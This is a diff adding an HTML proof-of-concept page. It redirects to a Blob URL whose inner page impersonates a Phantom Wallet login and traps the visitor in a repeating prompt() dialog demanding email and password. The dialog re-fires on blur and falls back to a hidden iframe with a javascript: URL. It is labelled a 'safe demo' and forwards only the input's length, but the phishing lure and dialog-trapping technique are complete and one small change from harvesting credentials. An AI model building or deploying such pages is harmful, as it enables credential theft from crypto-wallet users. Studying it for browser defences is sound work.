@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, user-scalable=no">
+<title>Blob Null → Forced Prompt (Safe)</title>
+<meta http-equiv="Content-Security-Policy" content="sandbox allow-scripts allow-modals">
+</head>
+<body>
+<script>
+(function () {
+  const inner = `<!DOCTYPE html>
+<html><head><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Blob Forced Prompt</title>
+<style>iframe{visibility:hidden;position:absolute;width:0;height:0;border:0}
+body{font-family:system-ui,sans-serif;text-align:center;padding-top:100px}</style>
+</head><body>
+<h1>Loading…</h1><iframe id="shim"></iframe>
+<script>
+(function(){
+  var msg='In order to access phantom.app\\nyou must first login on your\\nPhantom Wallet Account.\\n\\nPlease type your e-mail\\nand your password:';
+  function loopDirect(){
+    try{
+      var v='';
+      while(v===null||(''+v).trim()===''){ v=prompt(msg,'E-mail / Password.'); }
+      top.postMessage({tag:'demo', input:true, length:(''+v).length}, '*');
+      return true;
+    }catch(e){ return false; }
+  }
+  function loopIframe(){
+    try{
+      var code="(function(){try{var m="+JSON.stringify(msg)+";var v='';while(v===null||(''+v).trim()===''){v=prompt(m,'E-mail / Password.');}top.postMessage({tag:'demo',input:true,length:(''+v).length},'*');}catch(e){}})()";
+      document.getElementById('shim').src='javascript:'+code;
+      return true;
+    }catch(e){ return false; }
+  }
+  if(!loopDirect()) loopIframe();
+  window.onblur=function(){ setTimeout(function(){ if(!loopDirect()) loopIframe(); }, 50); };
+})();
+<\/script></body></html>`;
+
+  const blob = new Blob([inner], {type:'text/html'});
+  const url = URL.createObjectURL(blob);
+  location.replace(url); // auto-trigger
+})();
+
+// DEMO-safe: terima METADATA saja (bukan isi)
+window.addEventListener('message', (e) => {
+  if (e.data && e.data.tag === 'demo') {
+    console.log('[SAFE DEMO] prompt length =', e.data.length);
+  }
+});
+</script>
+</body>
+</html>
